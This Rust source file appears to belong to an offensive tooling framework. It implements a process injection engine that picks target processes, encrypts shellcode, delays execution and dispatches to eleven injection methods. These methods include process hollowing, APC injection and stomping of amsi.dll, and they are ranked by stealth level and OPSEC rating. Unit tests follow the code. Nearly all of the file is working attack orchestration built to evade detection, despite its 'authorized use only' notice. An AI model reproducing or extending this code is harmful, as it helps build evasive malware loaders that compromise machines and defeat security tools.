//! Process Injection Engine
//!
//! High-level injection orchestration with OPSEC awareness.
//!
//! MITRE ATT&CK: T1055 (Process Injection)
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY

use super::engine::StealthLevel;
use super::injection_techniques::{
    InjectionMethods, InjectionResult, InjectionTechnique, Shellcode,
};
use super::target_process::{IntegrityLevel, ProcessFinder, ProcessSelectionCriteria, TargetProcess};
use serde::{Deserialize, Serialize};

/// Injection configuration
#[derive(Debug, Clone)]
pub struct InjectionConfig {
    pub technique: InjectionTechnique,
    pub target_criteria: ProcessSelectionCriteria,
    pub target_pid: Option<u32>,
    pub encrypt_shellcode: bool,
    pub delay_before_inject: u64, // milliseconds
    pub verify_injection: bool,
    pub cleanup_on_failure: bool,
}

impl Default for InjectionConfig {
    fn default() -> Self {
        Self {
            technique: InjectionTechnique::NtCreateThreadEx,
            target_criteria: ProcessSelectionCriteria::SystemProcess,
            target_pid: None,
            encrypt_shellcode: true,
            delay_before_inject: 1000,
            verify_injection: true,
            cleanup_on_failure: true,
        }
    }
}

/// Process Injection Engine
#[derive(Debug)]
pub struct ProcessInjector {
    config: InjectionConfig,
    stealth_level: StealthLevel,
}

impl Default for ProcessInjector {
    fn default() -> Self {
        Self::new()
    }
}

impl ProcessInjector {
    /// Create new Process Injector
    pub fn new() -> Self {
        Self {
            config: InjectionConfig::default(),
            stealth_level: StealthLevel::Silent,
        }
    }

    /// Set injection configuration
    pub fn with_config(mut self, config: InjectionConfig) -> Self {
        self.config = config;
        self
    }

    /// Set stealth level
    pub fn with_stealth(mut self, level: StealthLevel) -> Self {
        self.stealth_level = level;
        self
    }

    /// Set injection technique
    pub fn with_technique(mut self, technique: InjectionTechnique) -> Self {
        self.config.technique = technique;
        self
    }

    /// Set target process by PID
    pub fn with_target_pid(mut self, pid: u32) -> Self {
        self.config.target_pid = Some(pid);
        self
    }

    /// Get recommended technique based on stealth level
    pub fn recommended_technique(&self) -> InjectionTechnique {
        match self.stealth_level {
            StealthLevel::Ghost => InjectionTechnique::DirectSyscall,
            StealthLevel::Silent => InjectionTechnique::ModuleStomping,
            StealthLevel::Quiet => InjectionTechnique::NtCreateThreadEx,
            StealthLevel::Normal => InjectionTechnique::ClassicRemoteThread,
        }
    }

    /// Find suitable target process
    pub fn find_target(&self) -> Option<TargetProcess> {
        if let Some(pid) = self.config.target_pid {
            // Return specific PID as target
            return Some(TargetProcess {
                pid,
                name: "custom".to_string(),
                path: None,
                is_64bit: true,
                integrity_level: IntegrityLevel::Unknown,
                injection_suitability: 5,
            });
        }

        let finder = ProcessFinder::new()
            .with_criteria(self.config.target_criteria)
            .require_64bit(true);

        finder.find()
    }

    /// Inject shellcode into target
    pub fn inject(&self, shellcode: &mut Shellcode) -> InjectionResult {
        // Find target
        let target = match self.find_target() {
            Some(t) => t,
            None => {
                return InjectionResult {
                    success: false,
                    technique: self.config.technique,
                    target_pid: 0,
                    thread_id: None,
                    allocated_address: None,
                    message: "No suitable target process found".to_string(),
                }
            }
        };

        // Encrypt if configured
        if self.config.encrypt_shellcode && !shellcode.is_encrypted {
            let key = Self::generate_key();
            shellcode.encrypt(&key);
        }

        // Delay before injection
        if self.config.delay_before_inject > 0 {
            std::thread::sleep(std::time::Duration::from_millis(
                self.config.delay_before_inject,
            ));
        }

        // Perform injection based on technique
        match self.config.technique {
            InjectionTechnique::ClassicRemoteThread => {
                InjectionMethods::classic_remote_thread(target.pid, shellcode)
            }
            InjectionTechnique::NtCreateThreadEx => {
                InjectionMethods::nt_create_thread_ex(target.pid, shellcode)
            }
            InjectionTechnique::QueueUserApc => {
                // Would need thread ID
                InjectionMethods::queue_user_apc(target.pid, 0, shellcode)
            }
            InjectionTechnique::EarlyBird => {
                InjectionMethods::early_bird("notepad.exe", shellcode)
            }
            InjectionTechnique::ThreadHijack => {
                InjectionMethods::thread_hijack(target.pid, 0, shellcode)
            }
            InjectionTechnique::ProcessHollowing => {
                InjectionMethods::process_hollowing("notepad.exe", &shellcode.bytes)
            }
            InjectionTechnique::ModuleStomping => {
                InjectionMethods::module_stomping(target.pid, "amsi.dll", shellcode)
            }
            InjectionTechnique::AtomBombing => {
                InjectionMethods::atom_bombing(target.pid, shellcode)
            }
            InjectionTechnique::CallbackInjection => {
                InjectionMethods::callback_injection(target.pid, shellcode)
            }
            InjectionTechnique::FiberInjection => {
                InjectionMethods::fiber_injection(target.pid, shellcode)
            }
            InjectionTechnique::DirectSyscall => {
                InjectionMethods::direct_syscall(target.pid, shellcode)
            }
        }
    }

    /// Auto-inject with best technique for current stealth level
    pub fn auto_inject(&self, shellcode: &mut Shellcode) -> InjectionResult {
        let technique = self.recommended_technique();

        let injector = ProcessInjector::new()
            .with_config(InjectionConfig {
                technique,
                ..self.config.clone()
            })
            .with_stealth(self.stealth_level);

        injector.inject(shellcode)
    }

    /// Generate random encryption key
    fn generate_key() -> Vec<u8> {
        use std::time::{SystemTime, UNIX_EPOCH};

        // Simple key generation using time-based seed
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0x12345678);

        (0..16)
            .map(|i| ((seed >> (i % 8)) ^ (i as u64 * 17)) as u8)
            .collect()
    }

    /// Get all available techniques with ratings
    pub fn list_techniques() -> Vec<TechniqueInfo> {
        InjectionTechnique::all()
            .iter()
            .map(|t| TechniqueInfo {
                technique: *t,
                opsec_rating: t.opsec_rating(),
                reliability: t.reliability(),
                mitre_id: t.mitre_id().to_string(),
                description: t.description().to_string(),
            })
            .collect()
    }

    /// Get current configuration
    pub fn config(&self) -> &InjectionConfig {
        &self.config
    }

    /// Get stealth level
    pub fn stealth_level(&self) -> StealthLevel {
        self.stealth_level
    }
}

/// Technique information for display
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TechniqueInfo {
    pub technique: InjectionTechnique,
    pub opsec_rating: u8,
    pub reliability: u8,
    pub mitre_id: String,
    pub description: String,
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_injector_creation() {
        let injector = ProcessInjector::new();
        assert_eq!(injector.stealth_level, StealthLevel::Silent);
    }

    #[test]
    fn test_recommended_technique() {
        let injector = ProcessInjector::new().with_stealth(StealthLevel::Ghost);

        assert_eq!(
            injector.recommended_technique(),
            InjectionTechnique::DirectSyscall
        );
    }

    #[test]
    fn test_config_builder() {
        let injector = ProcessInjector::new()
            .with_technique(InjectionTechnique::ModuleStomping)
            .with_target_pid(1234);

        assert_eq!(
            injector.config.technique,
            InjectionTechnique::ModuleStomping
        );
        assert_eq!(injector.config.target_pid, Some(1234));
    }

    #[test]
    fn test_list_techniques() {
        let techniques = ProcessInjector::list_techniques();
        assert!(!techniques.is_empty());
        assert_eq!(techniques.len(), 11);
    }

    #[test]
    fn test_default_config() {
        let config = InjectionConfig::default();
        assert_eq!(config.technique, InjectionTechnique::NtCreateThreadEx);
        assert!(config.encrypt_shellcode);
        assert_eq!(config.delay_before_inject, 1000);
    }

    #[test]
    fn test_stealth_level_techniques() {
        let ghost = ProcessInjector::new().with_stealth(StealthLevel::Ghost);
        let normal = ProcessInjector::new().with_stealth(StealthLevel::Normal);

        // Ghost should recommend more stealthy technique
        assert!(
            ghost.recommended_technique().opsec_rating()
                > normal.recommended_technique().opsec_rating()
        );
    }

    #[test]
    fn test_find_target_with_pid() {
        let injector = ProcessInjector::new().with_target_pid(9999);

        let target = injector.find_target();
        assert!(target.is_some());
        assert_eq!(target.unwrap().pid, 9999);
    }

    #[test]
    fn test_technique_info_structure() {
        let techniques = ProcessInjector::list_techniques();
        let first = &techniques[0];

        assert!(!first.mitre_id.is_empty());
        assert!(!first.description.is_empty());
        assert!(first.opsec_rating > 0);
        assert!(first.reliability > 0);
    }

    #[test]
    fn test_generate_key() {
        let key = ProcessInjector::generate_key();
        assert_eq!(key.len(), 16);
    }
}
